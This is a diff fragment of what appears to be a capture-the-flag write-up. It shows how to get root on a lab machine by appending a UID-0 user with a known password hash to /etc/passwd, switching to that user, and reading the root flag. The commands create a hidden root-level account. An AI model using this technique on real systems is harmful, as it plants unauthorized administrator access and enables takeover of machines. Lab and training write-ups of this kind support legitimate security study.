@@ -167,7 +167,18 @@ then give that password for new user `user1`
 echo 'user1:$1$omSAxpxQ$d102EUA0tdSWmNydywbng.:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
+now switch to user1 and provide password `123`:
 
+```bash
+su user1
+
+cd /root
+
+cat root.txt
+0d2c6222bfdd3701e0fa12a9a9dc9c8c
+```
+
+this is how you can get root on this machine :)
 
 
 
